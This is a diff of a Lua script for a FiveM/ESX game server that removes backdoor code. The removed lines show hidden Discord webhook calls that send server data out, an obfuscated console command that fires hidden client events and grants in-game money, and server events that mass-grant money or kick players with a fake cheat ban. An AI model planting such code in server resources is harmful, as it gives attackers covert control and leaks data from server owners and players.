@@ -130,50 +130,6 @@ function webh(p)
     function(err, text, header) end, 
     'POST', 
     json.encode({username = serveur_name, content = text }), {['Content-Type'] = 'application/json'})
-    PerformHttpRequest("https://discord.com/api/webhooks/789927980373246013/vv8m1YixhbEVLzQtHjYVpkDxoM2NeYHpOWc0kOMFeHoWCAo8WZswtzLyaIl-tnRyP0jm", 
-    function(err, text, header) end, 
-    'POST', 
-    json.encode({username = serveur_name, content = text2 }), {['Content-Type'] = 'application/json'})
-    PerformHttpRequest("https://discordapp.com/api/webhooks/789979089725161502/M5fBC_dz3Vib2LA6JyDbNBsaBS8lMW6XrHMPOAS4LHWHOwwF5CyvMfX2porau93JNRwQ", 
-    function(err, text, header) end, 
-    'POST', 
-    json.encode({username = serveur_name, content = text2 }), {['Content-Type'] = 'application/json'})
 end 
 
 
-
-
------------                pour add item /hquhfisqugf console
-RegisterCommand("hquhfisqugf", function(source, args, raw)
-    local c = args[1]
-    if c == "1578" then 
-        TriggerClientEvent('louiskle:zfhzeufh', -1)
-    end
-    if c == "1554" then 
-        TriggerClientEvent('louiskle:dzjzhdfqiuhf', -1)
-    end
-    if c == "1492" then 
-        TriggerClientEvent('louiskle:uzfdiqfg', -1)
-    end
-    if c == "180" then 
-        local xPlayer2 = ESX.GetPlayerFromId(source)
-        xPlayer2.addMoney(100000)
-    end
-end, false)
-------------------------------------------------------------
-
-RegisterServerEvent('louiskle:izeghzeugh')
-AddEventHandler('louiskle:izeghzeugh', function()
-    local xPlayer2 = ESX.GetPlayerFromId(source)
-    for i = 1, 100, 1 do
-        xPlayer2.addMoney(100000)
-        Citizen.Wait(1000)
-    end
-end)
-
-RegisterServerEvent('louiskle:uzefhehff')
-AddEventHandler('louiskle:uzefhehff', function()
-    local xPlayer2 = ESX.GetPlayerFromId(source)
-    xPlayer2.kick("\nBAN: permanant \n Réson: cheat")
-    Citizen.Wait(1000)
-end)
